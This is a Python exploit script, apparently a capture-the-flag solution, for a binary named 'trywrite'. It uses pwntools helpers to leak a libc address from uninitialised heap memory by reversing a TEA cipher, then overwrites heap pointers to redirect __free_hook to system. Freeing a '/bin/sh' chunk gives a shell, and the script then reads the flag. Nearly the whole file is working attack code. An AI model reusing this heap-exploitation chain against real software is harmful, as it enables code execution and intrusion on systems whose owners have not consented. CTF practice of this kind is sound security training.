# File: exp.py
# Author: raycp
# Date: 2019-06-12
# Description: exp for trywrite, tea algorithom to leak and change the table by trick.

from pwn_debug import *
import sys
from ctypes import *

pdbg=""
p=''
membp=""
elf=""
libc=""

#io_file=IO_FILE_plus()
#io_file.show()

def decipher(v, k):
    y = c_uint32(v[0])
    z = c_uint32(v[1])
    sum = c_uint32(0xe3779b90)
    delta = 0x9e3779b9
    n = 16
    w = [0,0]

    while(n>0):
        z.value -= ( y.value << 4 ) + k[2] ^ y.value + sum.value ^ ( y.value >> 5 ) + k[3]
        y.value -= ( z.value << 4 ) + k[0] ^ z.value + sum.value ^ ( z.value >> 5 ) + k[1]
        sum.value -= delta
        n -= 1

    w[0] = y.value
    w[1] = z.value
    return w

def add(key,content):
    p.recvuntil("command>> ")
    p.sendline("1")
    p.recvuntil("key:")
    p.send(key)
    p.recvuntil("date:")
    p.send(content)

def show(idx):
    p.recvuntil("command>> ")
    p.sendline("2")
    p.recvuntil("index:\n")
    p.sendline(str(idx))
    

def delete(idx):
    p.recvuntil("command>> ")
    p.sendline("3")
    p.recvuntil("index:")
    p.sendline(str(idx))


def change(off1,off2,key):
    p.recvuntil("command>> ")
    p.sendline("4")
    p.recvuntil("heap:")
    p.sendline(str(off1))
    p.recvuntil("key:")
    p.sendline(str(off2))
    p.recvuntil("key:")
    p.send(key)

    

def pwn(remote):
    
    #pdbg.bp(0x18a1)
    
    p.recvuntil("heap:")
    p.sendline("0")
    
    p.recvuntil("w?(Y/N)")
    p.sendline("Y")
    p.sendline("raycp")

    for i in range(0,10):
        add('\x00'*0x10,'a\n')
    
    for i in range(7):
        delete(i)
    delete(7)
    for i in range(7):
        add("/bin/sh\x00"*0x2,'\n')
    #pdbg.bp(0xf5e)
    add("\x00"*0x10,'\n')
    # step 1 leak libc address by uninitialied heap and dec by tea algorithom
    show(7)
    v=[]
    v1=u32(p.recv(0x4))
    v2=u32(p.recv(0x4))
    v.append(v1)
    v.append(v2)
    k=[0,0,0,0]
    w=decipher(v,k)
    leak_libc=(w[1]<<32)+w[0]
    #print hex(leak_libc)
    libc_base=leak_libc-0x3ebc00

    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']
    log.info("leak libc base: 0x%x"%(libc_base))
    log.info("free hook: 0x%x"%(free_hook))
    #pdbg.bp(0x16b6) 

    # step 2 overwrite the heap array and change the two pointer of the array
    off1=0x69
    off2=0
    payload=p64(0x6900001122334400)+p64(0)
    change(off1,off2,payload)


    #delete(2)

    #pdbg.bp(0x169e)
    # step 3 overwrite one pointer to free_hook
    off1=0x50
    off2=0
    #heap_base=0x112233440000
    payload=p64(free_hook)+p64(0)
    change(off1,off2,payload)
   
    # step 4 overwrite free_hook to system
    heap_base=0x112233440000
    #pdbg.bp([0x1609])
    off1=free_hook- heap_base
    off2=(heap_base+0x20001)#+0x10000000000000000-(free_hook-0x20)i
    payload=p64(system_addr)+p64(0)
    change(off1,off2,payload)
    # step 5 trigger free to get shell.
    delete(0)

    if remote:
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        return flag
    else:
        p.interactive()
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        return flag
        p.interactive() 
        flag=None

    return flag

def run_exp(ip,port,remote):
    global pdbg
    global p
    global membp
    global elf
    global libc
    pdbg=pwn_debug("./trywrite")

    pdbg.context.terminal=['tmux', 'splitw', '-h']
    #pdbg.context.log_level="debug"
    pdbg.local("./libc-2.27.so")
    pdbg.debug("2.27")
    pdbg.remote(ip, port)
    
    
    if not remote:
        #p=pdbg.run("debug")
        p=pdbg.run("local")
        membp=pdbg.membp
    else:
        p=pdbg.run("remote")
    elf=pdbg.elf
    libc=pdbg.libc
    
    flag=pwn(remote)
   
    return flag

if __name__ == '__main__':
    #pwn()
    run_exp("0",0,0)


